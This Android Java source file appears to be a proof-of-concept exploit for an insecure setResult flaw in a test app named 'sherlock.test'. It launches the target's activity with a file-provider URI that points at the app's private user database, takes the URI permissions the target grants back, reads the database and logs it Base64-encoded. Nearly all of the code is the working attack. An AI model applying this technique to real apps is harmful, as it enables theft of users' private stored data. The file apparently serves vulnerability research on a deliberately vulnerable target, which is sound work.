package sherlock.poc.insecure_set_result;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

public class BasicActivity extends AppCompatActivity {

    private static final String TAG = "sherlock.poc.insecure_set_result.BasicActivity";

    public static Intent newIntent(Context packageContext) {
        return new Intent(packageContext, BasicActivity.class);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setData(Uri.parse("content://sherlock.test.file_provider/root/data/data/sherlock.test/databases/userBase.db"));
        i.setClassName("sherlock.test",
                "sherlock.test.insecure_set_result.BasicActivity");
        i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        startForResult.launch(i);
    }

    ActivityResultLauncher<Intent> startForResult = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                if (result.getResultCode() == RESULT_OK) {
                    Intent data = result.getData();
                    Uri providerUri = data.getData();
                    try {
                        InputStream inputStream = getContentResolver().openInputStream(providerUri);
                        StringBuilder outputBuilder = new StringBuilder();

                        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                        String line;
                        try {
                            while ((line = reader.readLine()) != null) {
                                outputBuilder.append(line);
                            }
                            byte[] bytes = outputBuilder.toString().getBytes(StandardCharsets.UTF_8);
                            Log.d(TAG, "Output: " + Base64.encodeToString(bytes, Base64.DEFAULT));
                        } catch (IOException e) {
                            e.printStackTrace();
                        } finally {
                            try {
                                inputStream.close();
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }
                    } catch (FileNotFoundException e) {
                        throw new RuntimeException(e);
                    }
                }
            }
    );
}
